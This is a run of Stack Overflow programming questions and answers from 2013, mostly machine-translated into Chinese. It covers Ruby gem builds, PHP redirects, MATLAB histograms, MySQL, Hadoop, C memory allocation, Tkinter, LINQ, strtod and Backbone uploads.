您需要为您的 JPanel[设置首选大小](http://docs.oracle.com/javase/6/docs/api/javax/swing/JComponent.html#setPreferredSize%28java.awt.Dimension%29)，否则 JScrollPane 不知道它需要通过其滚动条支持的组件有多大。`setSize`有不同的目的，在这种情况下是不够的。

# ruby - 构建刀架空间宝石

> ID：15998668
> 
> 赞同：0
> 
> 时间：2013-04-14T11:43:35.150
> 
> 标签：ruby, gem

我想修改一个刀架空间 gem，以便能够使用 winrm 而不是 ssh 引导，但我无法构建 gem。[我已经从https://github.com/opscode/knife-rackspace](https://github.com/opscode/knife-rackspace)克隆了刀架空间代码

但是当我尝试运行 rake 时，出现以下错误

```
$ rake --trace
rake aborted!
Don't know how to build task 'default'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/task_manager.rb:49:in `[]'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:142:in `invoke_task'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:101:in `block (2 levels) in top_level'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:101:in `each'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:101:in `block in top_level'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:110:in `run_with_threads'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:95:in `top_level'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:73:in `block in run'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:160:in `standard_exception_handling'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/lib/rake/application.rb:70:in `run'
c:/opscode/chef/embedded/lib/ruby/gems/1.9.1/gems/rake-10.0.4/bin/rake:9:in `<top (required)>'
c:/opscode/chef/embedded/bin/rake:23:in `load'
c:/opscode/chef/embedded/bin/rake:23:in `<main>' 
```

我是 Ruby 的新手，所以我不知道它是什么意思或如何解决它....你知道吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:56:30.707

这意味着您没有尝试运行默认的 Rake 任务。尽管我认为您不想实际运行它。如果您对库进行了一些更改并想要构建 gem，请尝试以下操作：

```
$ gem build knife-rackspace.gemspec 
```

这应该为您构建一个knife-rackspace-0.6.3.gem 文件。

# php - 在标头重定向中使用 PHP_SELF 值是否安全？

> ID：15998669
> 
> 赞同：1
> 
> 时间：2013-04-14T11:44:01.897
> 
> 标签：php

即将其存储在会话中，然后当用户登录时，重定向到该页面？

```
$_SESSION['last_page'] = $_SERVER['PHP_SELF'];    
//(in a common file on all pages) 
```

然后登录后：

```
header('location: ' . $_SESSION['last_page']);` 
```

我想知道，因为我读到人们可以修改某些键的值`$_SERVER`

改用会更好`SCRIPT_NAME`还是可以`PHP_SELF`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T11:47:45.467

It can be used for XSS vulnerables.

Don't risk it and use

```
 $_SERVER['SCRIPT_NAME']; 
```

instead.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T11:50:09.257

设置 HTTP 标头时，不应为 Location 提供相对路径/URL，请指定脚本的完整 URL。

```
$_SESSION['last_page'] = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["PHP_SELF"];
header('Location: ' . $_SESSION['last_page']); 
```

`$_SERVER["SCRIPT_NAME"]`&之间的区别在于`$_SERVER["PHP_SELF"]`“`PHP_SELF`记住”在 URL 中引用 PHP 脚本之后指定的任何信息。如果您不需要这些额外信息，只需使用`$_SERVER["SCRIPT_NAME"]`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T11:46:50.733

Sessions variables cannot be trusted directly. They are considered *user input* just like GET or POST variables. Therefore I suggest you to list a number of possibilities (or alternatively use a REGEX) to test if `$_SESSION['last_page']` is valid, before use it, *especially* in a redirect.

# matlab - matlab中的imhist不显示直方图

> ID：15998673
> 
> 赞同：1
> 
> 时间：2013-04-14T11:44:34.597
> 
> 标签：matlab

我有一个名为boat 的图像存储在一个 .mat 文件 (Boat.mat) 中，我使用它加载了该文件，`load('Boat.mat')` 如果我键入`imshow(boat)`它只会显示一个空白框。我只能用 来查看图像`imshow(boat,[0 255])`。当我使用时，`imhist(boat)`我再次得到一个空白框。如何查看直方图。我需要查看直方图。我也不能`histeq(boat)`用于直方图均衡。

任何帮助将不胜感激。谢谢

这是 Boat.mat 文件的链接 [http://www.engr.colostate.edu/ECE513/SP11/Boat.mat](http://www.engr.colostate.edu/ECE513/SP11/Boat.mat)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-14T11:51:48.360

默认情况下，`imshow`假设浮点图像的值介于 0 和 1 之间，这就是为什么您的图像（值从 0 到 255）完全显示为白色的原因 - 所有值都大于 1。如您所见，您可以`imshow`强制以不同的方式缩放值，但如果您先重新缩放图像并保持这样，可能会更容易：

```
boatDbl = boat / 255;

figure;
imshow(boatDbl);

figure;
imhist(boatDbl); 
```

**编辑：**正如 Shai 在下面指出的那样，发生这种情况是因为`imshow`和其他人根据矩阵的数据类型预测值的范围 - 因为您的`boat`矩阵是 a `double`，所以他们假定范围为 0 到 1。因此，另一种解决方法是转换矩阵到一个`integer`类型，这将`imshow`假设范围为 0 到 255：

```
boat = uint8(boat); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-03-18T13:19:21.833

关于该`imhist(image)`部分，您可能想先尝试将图像转换为灰度（即使它最初是灰度图像），如下所示：

```
newImage = rgb2gray(oldImage); 
```

之后，您应该能够`imhist(newImage)`毫无问题地执行。让我知道它是否有效！

# php - 为什么循环会恢复？

> ID：15998677
> 
> 赞同：2
> 
> 时间：2013-04-14T11:44:44.150
> 
> 标签：php, mysql

我正在向 MySQL 表中插入一些数据以进行测试。下面的代码为每个添加了 20 行`c`。并且这样做直到价值`c`超过一百万。之后，它开始为之前添加的行添加行。我们如何解决这个问题？

```
for($c=1; $c<=2000000; $c++)
{
    for($i=0; $i<=19; $i++)
    { 
        $query = "INSERT INTO selections (c_id, i_id) VALUES('$c', '$i')";
        mysql_query($query) or die("Cannot add... " . mysql_error());
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:35:01.813

如果您的任务的目的只是填充数据，而不是尝试使用 php 脚本插入它，您可以使用像这样的简单存储过程在 mysql 中执行此操作

```
DELIMITER $$
CREATE PROCEDURE insert_selections(IN max_value INT)
BEGIN
DECLARE i INT DEFAULT 1;
WHILE i <= max_value DO
    INSERT INTO selections VALUES
     (i, 1), (i, 2), (i, 3), (i, 4), (i, 5), (i, 6), (i, 7), (i, 8), (i, 9), (i, 10), 
     (i, 11), (i, 12), (i, 13), (i, 14), (i, 15), (i, 16), (i, 17), (i, 18), (i, 19), (i, 20);
    SET i =  i + 1;
END WHILE;
END$$
DELIMITER ; 
```

并执行它

```
CALL insert_selections(2000000); 
```

*在我的 Mac 上花了几分钟*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:15:16.910

php 数字不太可能以百万级别包装，所以这可能是因为您的数据库的字段配置.. php 的简单测试：

```
 for($i = 2000000; $i < 2000020; i++)echo "$i"; 
```

你会看到php可以正确管理数字...

**在mysql中**

小灵通

```
A small integer
The signed range is –32768 to 32767\. The unsigned range is 0 to 65535 
```

中型

```
A medium-size integer
The signed range is –8388608 to 8388607\. The unsigned range is 0 to 16777215 
```

因此，如果您使用上述之一作为**c_id**的数据类型，它将在范围上限之后换行......

**警告**不要使用已弃用的 mysql 接口，请改用 PDO 或 mysqli 接口...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T12:46:30.313

共享的代码似乎在我的本地工作正常，我`unique index`在 2 列上添加了一个组合

```
CREATE TABLE `selections` (
    `c_id` INT(10) NULL DEFAULT NULL,
    `i_id` INT(10) NULL DEFAULT NULL,
    UNIQUE INDEX `c_id_i_id` (`c_id`, `i_id`)
) 
```

我猜你有`2 instances`相同的页面`executing`，导致重复的值

# jakarta-ee - java.lang.runtimeexception java.net.connectexception 运行 hadoop pi 示例

> ID：15998681
> 
> 赞同：1
> 
> 时间：2013-04-14T11:45:32.490
> 
> 标签：jakarta-ee, hadoop, mapreduce, hdfs

我已经在两台机器上配置了 hadoop。我可以使用 ssh 在没有密码的情况下访问两台机器。我已经使用以下命令成功格式化了 namenode：-

```
bin/hadoop namenode -format 
```

然后我尝试运行 hadoop.tar 附带的 pi 示例

```
sandip@master:~/hadoop-1.0.4$ bin/hadoop jar hadoop-examples-1.0.4.jar pi 5 500
Number of Maps  = 5
Samples per Map = 500
13/04/14 04:13:04 INFO ipc.Client: Retrying connect to server:       
master/192.168.188.131:9000\. Already tried 0 time(s).
13/04/14 04:13:05 INFO ipc.Client: Retrying connect to server:                         
master/192.168.188.131:9000\. Already tried 1 time(s).
13/04/14 04:13:06 INFO ipc.Client: Retrying connect to server:     
master/192.168.188.131:9000\. Already tried 2 time(s).
13/04/14 04:13:07 INFO ipc.Client: Retrying connect to server:   
master/192.168.188.131:9000\. Already tried 3 time(s).
13/04/14 04:13:08 INFO ipc.Client: Retrying connect to server:   
master/192.168.188.131:9000\. Already tried 4 time(s).
13/04/14 04:13:09 INFO ipc.Client: Retrying connect to server:      
master/192.168.188.131:9000\. Already tried 5 time(s).
13/04/14 04:13:10 INFO ipc.Client: Retrying connect to server:     
master/192.168.188.131:9000\. Already tried 6 time(s).
13/04/14 04:13:11 INFO ipc.Client: Retrying connect to server:   
master/192.168.188.131:9000\. Already tried 7 time(s).
13/04/14 04:13:12 INFO ipc.Client: Retrying connect to server:   
master/192.168.188.131:9000\. Already tried 8 time(s).
13/04/14 04:13:13 INFO ipc.Client: Retrying connect to server:    
master/192.168.188.131:9000\. Already tried 9 time(s).
java.lang.RuntimeException: java.net.ConnectException: Call to    
master/192.168.188.131:9000 failed on connection exception: java.net.ConnectException:    
Connection refused
at org.apache.hadoop.mapred.JobConf.getWorkingDirectory(JobConf.java:546)
at org.apache.hadoop.mapred.FileInputFormat.setInputPaths(FileInputFormat.java:318)
at org.apache.hadoop.examples.PiEstimator.estimate(PiEstimator.java:265)
at org.apache.hadoop.examples.PiEstimator.run(PiEstimator.java:342)
at org.apache.hadoop.util.ToolRunner.run(ToolRunner.java:65)
at org.apache.hadoop.examples.PiEstimator.main(PiEstimator.java:351)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at     
sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:616)
at 
 org.apache.hadoop.util.ProgramDriver$ProgramDescription.invoke(ProgramDriver.java:68)
at org.apache.hadoop.util.ProgramDriver.driver(ProgramDriver.java:139)
at org.apache.hadoop.examples.ExampleDriver.main(ExampleDriver.java:64)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T12:53:28.230

哦，MG 我忘了启动 hadoop 集群。我通过运行以下命令修复了它：-

bin/start-all.sh

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T13:04:17.457

它说：连接被拒绝。通过查看日志，我可以说在启动集群时，您的机器无法连接到 namenode。

检查以下内容： - 名称节点地址是否正确（您使用 core-site.xml 中的 default.fs.name 给它） - 检查您是否在 mapred-site.xml 中指定了正确的任务跟踪器地址 - 检查您是否已指定core-site.xml 中的 hadoop.tmp.dir 属性。并且格式化后这个目录存在于你的机器上。

- 格式化后只需验证另一件事是 VERSION 文件应该在主节点和从节点中包含相同的名称空间 ID。

# javascript - Upload HTML5 canvas image to Facebook through javascript api

> ID：15998689
> 
> 赞同：1
> 
> 时间：2013-04-14T11:46:33.527
> 
> 标签：javascript, html, jquery, facebook-graph-api, canvas

Presently, I am able to upload an image to Facebook through it's javascript api but I need to save the image on my server which is taking time. I want to upload the canvas image directly to Facebook without saving it on server and it should work with IE9 too, is there any tutorial or documentation to achieve this?

# c - C：动态内存分配 - 输出错误

> ID：15998693
> 
> 赞同：0
> 
> 时间：2013-04-14T11:46:59.687
> 
> 标签：c, io, dynamic-arrays

我正在尝试编写一个简单的程序，它接受特定的输入，动态分配它，输出它并释放它。问题是它没有正确输出。输入的样式如下：

第一行是我需要阅读的行数 - i。

然后有 i 行。在每一行上，我读一个单词，然后是一个整数 n，它显示接下来将进行多少个整数，然后是 n 个整数。

例如，

```
2
yellow 2 32 44
green 3 123 3213 3213 
```

解释：

第一行 - 必须有 2 行。

第 2 和第 3 行 - 单词 + 整数个数 + 整数。

我的尝试：

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    int i, j;
    int n; /* n - number of words */
    char **words; /* words - array of keywords */
    int **data;
    scanf ("%d\n", &n);

    words = (char **) malloc (n * sizeof (char *));
    data = (int **) malloc (n * sizeof (int *));

    for (i = 0; i < n; ++i)
    {
        words[i] = (char *) malloc (sizeof (char));
        for (j = 0 ;; ++j)
        {
            words[i] = (char *) realloc (words[i], sizeof (char) * (j + 2));
            scanf ("%c", &words[i][j]);

            if (words[i][j] == ' ')
                break;
            else if (words[i][j] == '\n')
                --j;

        }

        words[i][j] = '\0';
        data[i] = (int *) malloc (sizeof (int));
        scanf ("%d", &data[i][0]);

        for (j = 0; j < data[i][0]; ++j)
        {
            data[i] = (int *) realloc (data[i], sizeof (int) * (j + 2));
            scanf ("%d", &data[i][j]);
        }
    }

    for (i = 0; i < n; ++i)
    {
        printf ("%s ", words[i]);
        printf ("%d ", data[i][0]);
        for (j = 0; j < data[i][0]; ++j)
        {
            printf ("%d ", data[i][j]);
        }
        printf ("\n");
    }

    for (i = 0; i < n; ++i)
    {
        free (words[i]);
        free (data[i]);
    }
    free (words);
    free (data);
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:19:20.317

`data = (int **) malloc (n * sizeof (char *));`这没有任何意义......返回值指向`int *`，但您分配的是`sizeof (char *)`. 这两个不需要具有相同的表示，这意味着它们不需要具有相同的宽度。有关更多信息，请参阅[此页面](http://c-faq.com/null/machexamp.html)。PS：[不要施放 malloc](http://c-faq.com/malloc/mallocnocast.html)。当您在那里时，请阅读网站的其余部分。它将防止您遇到未来的常见问题。同时，我假设您的意思是`data = malloc(n * sizeof *data);`.

`n`顺便说一句，应该是 a`size_t`而不是`int`. 要接收`size_t`using `scanf`，请使用`%zu`格式说明符。下面提供了一个示例。

* * *

```
 data[i] = (int *) malloc (sizeof (int));
    scanf ("%d", &data[i][0]);
    for (j = 0; j < data[i][0]; ++j)
    {
        data[i] = (int *) realloc (data[i], sizeof (int) * (j + 2));
            scanf ("%d", &data[i][j]);
    } 
```

在这个缩进很差的代码示例中（没有人愿意阅读，因为它的缩进很差），存在一个问题。该问题通常不会被发现，因为在正确格式化之前没有人愿意阅读它，删除不必要的强制转换并考虑它呈现的愚蠢逻辑。

循环应该在`j == data[i][0]`. 在循环的第一次迭代中，发生了`data[i][0]`变化，因此循环的条件发生了变化。因此，这个循环没有做你想做的事。也许你打算写这样的东西：

```
 size_t count;
    /* Note how scanf returns a value, and when that value isn't 1 an assertion error
     * is raised? An exercise for you is to get that assertion error to raise, or read
     * the manual... */
    assert(scanf("%zu", &count) == 1);

    /* Note how malloc doesn't need a cast? */
    data[i] = malloc(count * sizeof data[i][0]);
    for (j = 0; j < count; ++j)
    {
        /* Note how count never changes, in this loop? */
        assert(scanf("%d ", &data[i][j]) == 1);
    } 
```

当我们讨论这个主题时，您会注意到我在最后一个`scanf`格式字符串的末尾添加了一个空格。该空间从`stdin`. 这样做的原因可能与之前循环中损坏的代码的目的相同，`'\n'`在读取下一项“单词”之前读取并丢弃任何字符：

* * *

```
 words[i] = (char *) malloc (sizeof (char));
    for (j = 0 ;; ++j)
    {
        words[i] = (char *) realloc (words[i], sizeof (char) * (j + 2));
        scanf ("%c", &words[i][j]);
        if (words[i][j] == ' ')
            break;
        else if (words[i][j] == '\n')
            --j;
    }
    words[i][j] = '\0'; 
```

`'\n'`现在几乎消除了前导字符的可能性，除了用户在不输入单词的情况下恶意按下回车。`malloc`移除演员表，以及视觉中更明智的分配算法，我想你的意思是：

```
 size_t j = 0;
    words[i] = NULL;
    for (int c = getchar(); c >= 0; c = getchar()) {
        /* Reallocate when j is a power of two, eg: 0, 1, 2, 4, 8, 16...
         * ... and double the size of the buffer each time
         */
        if (j & (j - 1) == 0) {
            char *temp = realloc(words[i], j * 2 + 1);
            /* hint: Check *all* return values */
            assert(temp != NULL);
            words[i] = temp;
        }

        if (strchr(" \n", c) == NULL) { break; }
        words[i][j] = c;
        j++;
    }

    words[i][j] = '\0'; 
```

# python - 从 JSON 中省略空路点条目

> ID：15998694
> 
> 赞同：-1
> 
> 时间：2013-04-14T11:47:03.780
> 
> 标签：python, json

如果在相应的输入框中没有输入任何内容，我该如何修改这个程序，使其不包含有关“航点”的任何信息？换句话说，“数据”有树部分，但如果在例如 E2 中没有输入任何内容，我希望数据是`[ { 'Way point1':(2,E1.get()), 'c':3.0 } ]`

```
from Tkinter import *
import json

top = Tk()
L1 = Label(top, text="Way point1")
L1.pack()
E1 = Entry()

E1.pack()
L2 = Label(top, text="Way point2")
L2.pack()
E2 = Entry()
E2.pack()

def printout():
    data = [ { 'Way point1':(2,E1.get()), 'Way point2':(2, E2.get()), 'c':3.0 } ]
    print json.dumps(data, sort_keys=True, indent=2)

plus = Button(top,  text='+', command=printout).pack(side=LEFT)

top.mainloop() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:59:19.840

对于只有 2 个航点，只需使用`if`语句：

```
waypoints = {'c': 3.0}
if E1.get():
    waypoints['Way point1']: (2, E1.get())
if E2.get():
    waypoints['Way point2']: (2, E2.get())

data = [waypoints] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:08:21.453

如果您计划在未来添加额外的航点，您可以将其构建到一个列表中进行迭代：

```
from Tkinter import *
import json

E = []
L = []
top = Tk()

number_of_waypoints = 2    

for n in range(1, number_of_waypoints+1): #+1 as 1...N
    l = Label(top, text="Way point%d" % n)
    l.pack()

    e = Entry()
    e.pack()

    E.append(e)
    L.append(l)

def printout():
    # Iterate over the zip of E & L (joined), building the dict using .cget('text') to get
    # the value of the Tkinter label. Add the { 'c':3.0 } to the end of the resulting list
    data = [ { l.cget("text"): (2,e.get()) } for e,l in zip(E,L) ] + [{ 'c':3.0 }]
    print json.dumps(data, sort_keys=True, indent=2)

plus = Button(top,  text='+', command=printout).pack(side=LEFT)

top.mainloop() 
```

# mysql - SQL 查询错误消息

> ID：15998703
> 
> 赞同：1
> 
> 时间：2013-04-14T11:47:35.287
> 
> 标签：mysql, sql, create-table

我有这个 SQL 查询

```
 CREATE TABLE items(
   partnum VARCHAR( 20 ) NOT NULL ,
   DESC VARCHAR( 50 ) NOT NULL ,
   price INT( 11 ) NOT NULL ,
   src VARCHAR( 25 ) NOT NULL ,
   PRIMARY KEY (  `partnum` )
   ); 
```

它旨在在我的数据库中创建一个表，但我不断收到以下错误：

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'desc varchar(50) NOT NULL,
 price int(11) NOT NULL,
 src varchar(25) NOT NULL,
 ' at line 3 
```

知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:49:51.510

Desc 是保留关键字，不能用作列名，请放在引号中

或将其重命名为例如描述

# linq - 使用 Linq 动态选择要获取的属性

> ID：15998704
> 
> 赞同：0
> 
> 时间：2013-04-14T11:47:37.217
> 
> 标签：linq, dynamic-programming

我有一个 MVC 应用程序，其中一个页面上有一个动态表，用户定义了表有多少列、列顺序以及从哪里获取每个字段的数据。

我写了一些非常糟糕的代码来保持动态，现在我希望它更有效率。

我的问题是我不知道如何定义我应该在运行时回到我的 IEnumerable 的列。我的主要问题是我不知道我可能有多少列。

我有一个获取字段文本的类的引用。我还有一个包含每个字段顺序的字典，其中包含确切的属性它应该从中获取数据。

我的代码应该是这样的：

```
var docsRes3 = from d in docs
                       select new[] 
                       {  
                           for (int i=0; i<numOfCols; i++)
                           {
                               gen.getFieldText(d, res.FieldSourceDic[i]);
                           }
                       }; 
```

其中：
*docs* = 我只想从中获取特定字段 的
*列表 res.FieldSourceDic* = 字典，其中键是列的顺序，值是属性
*gen.getFieldText* = 获取实体和属性的函数和返回值

显然，它不起作用。

我也试过

```
StringBuilder fieldsSB = new StringBuilder();
        for (int i = 0; i < numOfCols; i++)
        {
            string field = "d." + res.FieldSourceDic[i] + ".ToString()";
            if (!string.IsNullOrEmpty(fieldsSB.ToString()))
            {
                fieldsSB.Append(",");
            }
            fieldsSB.Append(field);
        }

        var docsRes2 = from d in docs
                       select new[] { fieldsSB.ToString() }; 
```

它也没有工作。

到目前为止，唯一对我有用的是：

```
List<string[]> docsRes = new List<string[]>();
        foreach (NewOriginDocumentManagment d in docs)
        {
            string[] row = new string[numOfCols];

            for (int i = 0; i < numOfCols; i++)
            {
                row[i] = gen.getFieldText(d, res.FieldSourceDic[i]);
            }

            docsRes.Add(row);
        } 
```

知道如何将 linq 传递给字段列表，它会有效地从中删除所需的数据吗？

谢谢，锄头我很清楚我需要什么....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:46:49.927

尝试以下操作：

```
var docsRes3 = from d in docs
               select ( 
                   from k in res.FieldSourceDic.Keys.Take(numOfCols)
                   select gen.getFieldText(d, res.FieldSourceDic[k])); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T13:28:44.270

我从以下链接得到了一些帮助：http: [//www.codeproject.com/Questions/141367/Dynamic-Columns-from-List-using-LINQ](http://www.codeproject.com/Questions/141367/Dynamic-Columns-from-List-using-LINQ)

首先，我创建了一个包含所有属性的字符串数组：

```
//Creats a string of all properties as defined in the XML
        //Columns order must be started at 0\. No skips are allowed
        StringBuilder fieldsSB = new StringBuilder();
        for (int i = 0; i < numOfCols; i++)
        {
            string field = res.FieldSourceDic[i];
            if (!string.IsNullOrEmpty(fieldsSB.ToString()))
            {
                fieldsSB.Append(",");
            }
            fieldsSB.Append(field);
        }
        var cols = fieldsSB.ToString().Split(',');

        //Gets the data for each row dynamically
        var docsRes = docs.Select(d => GetProps(d, cols)); 
```

比我创建了 GetProps 函数，该函数使用我自己的函数，如问题中所述：

```
private static dynamic GetProps(object d, IEnumerable<string> props)
    {
        if (d == null)
        {
            return null;
        }

        DynamicGridGenerator gen = new DynamicGridGenerator();
        List<string> res = new List<string>();

        foreach (var p in props)
        {
            res.Add(gen.getFieldText(d, p));
        }

        return res;
    } 
```

# c - 如何使用 DBL_MANT_DIG 检查 strtod

> ID：15998705
> 
> 赞同：0
> 
> 时间：2013-04-14T11:47:40.400
> 
> 标签：c, floating-point

考虑以下代码：

```
#include <stdio.h>
#include <limits.h>
#include <stdlib.h>
#include <errno.h>
#include <float.h>

int main (void) {
    double val;
    /* base b = 2; 2^DBL_MANT_DIG */
    /* decimal digits log10(2^DBL_MANT_DIG) */
    /*const char *str = "9007199254740992";*/
    const char *str = "9007199254740993";

    errno = 0;
    val = strtod(str, NULL);

    printf("%d\n", DBL_MANT_DIG );

    if (errno == ERANGE) {
        printf("error\n");
    } else {
        printf("%f\n", val);
    }

    return 0;
} 
```

这将返回：

```
53
9007199254740992.000000 
```

由于 str 的字符串数字的有效数字比我的机器可以处理的多，如何使用它`DBL_MANT_DIG`或`log10(2^DBL_MANT_DIG)`它的版本来检查结果`val`是否正确？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:04:12.493

您不使用它们来检查转换是否准确。

[这是如何做到这一点的一种方法](https://stackoverflow.com/a/8455604/968261)。

另一种方法是[找出结果中小数点后有多少个小数位，`double`](https://stackoverflow.com/a/15197157/968261)将`sprintf()`其用作精度并将其输出与原始字符串进行比较。

# javascript - 不懂这个 javascript 函数语法

> ID：15998708
> 
> 赞同：0
> 
> 时间：2013-04-14T11:47:49.020
> 
> 标签：javascript

有人可以解释一下这个javascript语法吗？

n: { } 是什么意思？

是不是意味着 AVSetFocus 返回了一个 nobject（已经被赋予了临时名称 n，它由 'fields' t、f 和 a 组成。t 是一个对象（看起来像），f 是对象 t 的一个函数，并且a 是一个数组？

所以 AVSetFocus 返回一个对象、一个函数和一个数组。这个函数真的调用 SetFocusToField 吗？

这种风格叫什么？

有点糊涂。

```
function AVSetFocus(d, b) {
    return {
        n: {
            t: FocusMgr,
            f: FocusMgr.SetFocusToField,
            a: [d, b]
        }
    }
} 
```

刚刚还发现了这个：

```
var FocusMgr;

function FocusMgr_Init() {
    FocusMgr = new function () {
        this.mCurFocusID = 0;
        this.mCurFocusWindowID = 0;
        this.mCurFocusElement = null;
        this.mOpenedWindow = false;
        this.mFocusStk = [];
        //etc
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:51:09.233

该`AvSetFocus()`函数返回此对象：

```
{
    n: {
        t: FocusMgr,
        f: FocusMgr.SetFocusToField,
        a: [d, b]
    }
} 
```

该对象有一个属性 ，`"n"`它本身引用另一个对象：

```
 {
        t: FocusMgr,
        f: FocusMgr.SetFocusToField,
        a: [d, b]
    } 
```

...它又具有三个属性。`"t"`引用（可能）另一个对象，`"f"`引用同一个对象的方法`"t"`引用，这似乎有点多余，因为您可以访问该 via `""t`，并最终引用作为参数`"a"`传入的两个值的数组。`AvSetFocus()`

> *“这个函数真的调用 SetFocusToField 吗？”*

不，它没有。你可能会像这样使用它：

```
var avsf = AvSetFocus(x, y);
avsf.n.f();  // calls FocusMgr.SetFocusToField() 
```

或者你可以这样做：

```
AvSetFocus(x, y).n.f(); 
```

至于您传递给的参数`AvSetFocus()`应该是什么，我不知道 - 从显示的代码中无法判断。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:48:16.897

> Does it mean that AVSetFocus returns a nobject (which has been given the temporary name, n, which consists of 'fields' t, f and a. t is an object (looks like), f is a function of the object t, and a is an array?

`{}` is the object literal notation. It creates a new object. So yes you are correct.

The `f` variable is just a reference to the method, but it is not executed.

You can call the function by doing `n.f();`

# javascript - backbone and javascript: upload and store the image data in GAE datastore?

> ID：15998709
> 
> 赞同：0
> 
> 时间：2013-04-14T11:48:02.763
> 
> 标签：javascript, python, image, google-app-engine, backbone.js

I have been searching through wherever possible but got no help at all for this question. I am working on a small program using python GAE with backbone javascript, I want the user can create a new book with a html form given below and store the new book in the GAE datastore, the form contains strings and an image.

```
<form>
    <div><label>Title:</label> <input type="text" id="title" name="book_title" ></div>
<div><label>Author:</label> <input type="text" id="author" name="book_author" ></div>     
    <div><label>Picture:</label> <input id="image" type="file" class="upload" name="img" /></div>
    <div><img id="img_preview" src="#" alt="image" ></img></div>
    <div><button class="create_book">Create Book</button></div>
 </form> 
```

selecting a book picture from the local file system is handled by displayPicture method in order to load a thumbnail image on the page for preview.

clicking "Create Book" button event is handled by the createBook method in javascript file:

```
event:{
    "click .create_book": "createBook" ,
    "change .upload": "displayPicture",
     ......
},
createBook:function(){
    this.model.set({
         title: $('#title').val(),
         author: $('#author').val(),
         image: this.pictureFile.name
    });
    ......
    app.bookList.create(this.model,{wait:true,
          success:function(){
                alert("A new book has been created!");
          }
    });
    return false;
  },  
    ......
    displayPicture: function(evt){
          var files = evt.target.files;
          if(files){
              this.pictureFile = files[0];
              var reader = new FileReader();
              reader.onloadend = function(){
                   $('#img_preview').attr('src',reader.result).width(200).height(200);
              };
              reader.readAsDataURL(this.pictureFile);
     },
     .......... 
```

at the python server end:

```
 class Book(db.Model):
         title = db.StringProperty()
         author = db.StringProperty()
         image = db.BlobProperty()

      class createBook(webapp.RequestHandler):
          def post(self):
              book = Book()
              book.title = self.request.get("title")
              book.author = self.request.get("author")  
              book.image = db.Blob(self.request.get("image"))
              book.put()
          ......

        application = webapp.WSGIApplication( 
        [
        .....
        ('/books/?',createBook)
        ],
        debug=Ture
        ) 
```

I can only display the thumbnail picture on the page for preview, but fail to create the new book, the line "app.bookList.create(...)" does send a POST request to the python server end, and the request is handled by the "createBook" method, but Firebug shows the "self.request.get("title"/"author"/"image")" lines are just an empty string, which means the content of the form is not retrieved from the Http request properly. can you tell what are the problems in my code snippet ? thanks for your help.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T19:40:42.013

我认为您的问题很可能是您将模型传递给`create`. 从骨干文档：

> 创建集合。创建（属性，[选项]）
> 
> 方便在集合中创建模型的新实例。

`create`不期望模型，因为它创建了模型；它所期望的是一个原始的 JSON 对象（例如。`{foo: bar}`）。

****编辑****实际上，这是不正确的，创建可以接受（未保存的）模型；以任何方式将接下来的几行留在这里，这样就不会太混乱。

您*可以*通过以下方式解决此问题：

```
app.bookList.create(this.model.attributes, {wait:true, 
```

或者：

```
app.bookList.create(this.model.toJSON(), {wait:true, 
```

但实际上你根本不需要使用`create`，因为你不需要创建模型（你已经有了一个）。您（可能）想要做的是`add`您对集合拥有的模型：

```
app.bookList.add(this.model) 
```

然后分别与服务器同步：

```
this.model.save(null, {wait:true,
      success:function(){
            alert("A new book has been created!");
      }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-17T03:58:56.983

在 python 端，你应该从

```
self.request.body 
```

不是

```
self.request.get('xxx') 
```

